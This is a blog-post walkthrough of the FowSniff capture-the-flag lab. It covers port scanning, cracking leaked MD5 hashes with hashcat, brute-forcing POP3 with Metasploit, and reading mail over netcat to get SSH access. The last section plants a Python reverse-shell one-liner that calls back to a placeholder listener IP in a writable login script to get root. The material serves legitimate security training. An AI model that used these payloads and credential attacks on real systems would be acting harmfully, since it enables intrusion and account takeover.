---
layout: post
title: "fowsniff challenge"
author: Alex Maina Weru
date: 2025-12-08
categories: [Lab and CTF challenges]
tags: [ctf, htb, tryhackme, labs]
image:
  path: assets/fowmain.jpeg
  alt: Blog-as-Code
---

## 🎯 FOWSNIFF CTF Walkthrough
![](/assets/fow1.png)


This guide details the steps to exploit the FOWSNIFF boot2root machine, targeting IP **10.10.25.67**.

### 1\. Initial Enumeration (Nmap)

The first step is to scan the target to identify open ports and services.

**Query:** Using nmap, scan this machine. What ports are open?

![](/assets/fow2.png)

**Answer:**

- Port 22 (SSH)
- Port 80 (HTTP)
- Port 110 (POP3)
- Port 143 (IMAP)

### 2\. Information Gathering (Port 80 & Google)

We explore the open services, starting with the web server on Port 80, and use public search tools as suggested.

**Query:** Using the information from the open ports, look around. What can you find? / Using Google, can you find any public information about them?

**Findings:**

- **Port 80 (Web Server):** The website confirms the **FowSniff Corporation suffered a data breach**.
- **Google/Social Media:** The fictional company's Twitter account, @fowsniffcorp, was compromised and contained a link to a Pastebin dump with **usernames and MD5 password hashes**.

### 3\. Decoding MD5 Hashes

The compromised data provides a list of usernames and their MD5 password hashes. These need to be cracked.

![](/assets/fow3.png)

**Query:** Can you decode these md5 hashes?

**Process (using hashcat):**

- Save the hashes into a file (e.g., md5.txt).
- Use a password cracking tool like hashcat with a common wordlist (like rockyou.txt).

Bash

hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt.gz --potfile-path cracked_passwords.txt

![](/assets/fow4.png)
**Result:** A list of clear-text usernames and passwords is recovered.

### 4\. Brute-Forcing POP3 Login (Metasploit)

With the recovered credentials, we attempt to brute-force the POP3 service on Port 110.

**Query:** Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?

**Process:**

- Create a file for known **usernames** (e.g., user.txt).
  ![](/assets/fow5.png)
- Create a file for known **passwords** (e.g., passwd.txt).
  ![](/assets/fow6.png)
- Launch **Metasploit** and use the auxiliary/scanner/pop3/pop3_login module.
  ![](/assets/fow7.png)
  
  ![](/assets/fow8.png)
**Query:** What was **seina's** password to the email service?

  ![](/assets/fow9.png)

**Answer (from successful brute-force):**

**Password:** scoobydoo2

### 5\. Accessing POP3 Emails

We use the successful login credentials for the user seina to access her mailbox and gather more information.

**Query:** Can you connect to the pop3 service with her credentials? What email information can you gather?

**Process (using netcat):**

- Connect to the POP3 service: nc 10.10.25.67 110
- Authenticate with USER seina and PASS scoobydoo2.
- List messages: LIST
  
  ![](/assets/fow10.png)
  
- Retrieve Message 1: RETR 1
  
![](/assets/fow11.png)
**Query:** Looking through her emails, what was a temporary password set for her?

**Answer (from Message 1):**

**SSH Temporary Password:** S1ck3nBluff+secureshell

- Retrieve Message 2: RETR 2

  ![](/assets/fow12.png)

**Query:** In the email, who send it?

**Answer (from Message 2):**

**Sender/SSH Username:** baksteen@fowsniff (Username: **baksteen**)

### 6\. SSH Access and Initial Post-Exploitation

With the username baksteen and the temporary password, we can now connect via SSH.

**Connection:**

Bash

ssh baksteen@10.10.25.67

 ![](/assets/fow13.png)

**Query:** Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?

![](/assets/fow14.png)

**Investigation:**

- Use the groups command to list user groups.
- Check for files writable by these groups or with unusual permissions.
- We discover the executable script: **cube.sh**

  ![](/assets/fow15.png)

### 7\. Privilege Escalation via Writable Script

The cube.sh script is writable and executes upon SSH login via the update-motd.d mechanism. This is the key to gaining a root shell.

![](/assets/fow16.png)

**Query:** Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

**Process:**

- **Modify cube.sh:** Edit the script to include a reverse shell payload.
  - **Note:** The script is triggered by /etc/update-motd.d/00-header when logging in via SSH.
  

**Python Reverse Shell Payload:**

Replace &lt;IP&gt; with your listener IP and 1234 with your listening port.

Python

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;YOUR_IP&gt;",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

![](/assets/fow16.png)

![](/assets/fow17.png)

- **Set up Listener:** On your attack machine, start a netcat listener.

Bash

nc -lvnp 1234

- **Trigger the Shell:** Exit the current SSH session and log back in. The modified cube.sh will execute, sending a reverse shell to your listener.

  ![](/assets/fow18.png)

  

Bash

exit

ssh baksteen@10.10.25.67

![](/assets/fow19.png)
 
- **Root Shell:** Upon successful login, you will receive a reverse shell as the **root** user on your netcat listener.

### 8\. Final Flag

With root access, the final step is to locate and read the flag file.

![](/assets/fow20.png)

**Action:**

- Navigate to the root directory: cd /root
- Find and read the flag: cat flag.txt

**Result:**

The content of **flag.txt** contains the congratulatory message.
